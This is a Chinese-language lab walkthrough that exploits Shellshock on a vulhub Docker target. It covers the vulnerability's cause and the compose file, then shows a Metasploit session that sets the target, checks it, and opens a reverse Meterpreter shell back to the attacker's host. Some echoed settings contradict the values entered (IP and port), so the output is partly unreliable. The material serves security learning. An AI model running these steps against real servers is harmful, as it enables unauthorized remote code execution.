### 1、漏洞原理
```shell script
该 Bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以 (){ 开头定义的环境变量在命令 ENV 中解 析成函数后， Bash 执行并未退出，而是继续解析并执行shell命令。
```
### 2、环境搭建
docker-compose.yaml
```yaml
version: '2'
services:
 web:
   network_mode: bridge
   image: vulhub/bash:4.3.0-with-httpd
   ports:
    - "8084:80"
   volumes:
    - ./safe.cgi:/var/www/html/safe.cgi
    - ./victim.cgi:/var/www/html/victim.cgi
```
### 3、登陆靶机，进行查看
![image](https://github.com/498946975/Security/blob/master/images/shellshock_1.png)
### 4、漏洞攻击
#### 使用postman，将payload附在User-Agent中访问victim.cgi
![image](https://github.com/498946975/Security/blob/master/images/shellshock_2.png)
#### 同样的数据包访问safe.cgi，不受影响:
![image](https://github.com/498946975/Security/blob/master/images/shellshock_3.png)
### 5、使用msf进行攻击
```shell script
msf6 > search shellshock      # 搜索漏洞框架

Matching Modules
================

   #   Name                                               Disclosure Date  Rank       Check  Description
   -   ----                                               ---------------  ----       -----  -----------
   0   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection (Shellshock)
   1   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   2   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   3   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
   4   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection (Shellshock)
   5   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection (Shellshock)
   6   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection (Shellshock)
   7   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
   8   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection (Shellshock)
   9   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection (Shellshock)
   10  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection (Shellshock)
   11  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution


Interact with a module by name or index. For example info 11, use 11 or use exploit/multi/misc/xdh_x_exec
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec        # 使用框架
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
```
### 6、设置参数
![image](https://github.com/498946975/Security/blob/master/images/shellshock_4.png)
```shell script
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 172.16.120.252   # 设置攻击地址
RHOSTS => 172.17.0.2
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rport 8084  # 设置攻击端口
rport => 80
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /victim.cgi # 设置攻击url
TARGETURI => /victim.cgi
```
### 7、检查漏洞，并攻击
```shell script
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
[+] 172.16.120.252:8084 - The target is vulnerable.
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit

[*] Started reverse TCP handler on 172.16.120.177:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (984904 bytes) to 172.16.120.252
[*] Meterpreter session 1 opened (172.16.120.177:4444 -> 172.16.120.252:51878 ) at 2022-01-20 08:53:59 +0800

meterpreter > pwd
/var/www/html
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  10701  fil   2022-01-15 11:06:08 +0800  index.html
100755/rwxr-xr-x  299    fil   2022-01-15 11:05:18 +0800  safe.cgi
100755/rwxr-xr-x  320    fil   2022-01-15 11:05:18 +0800  victim.cgi
```
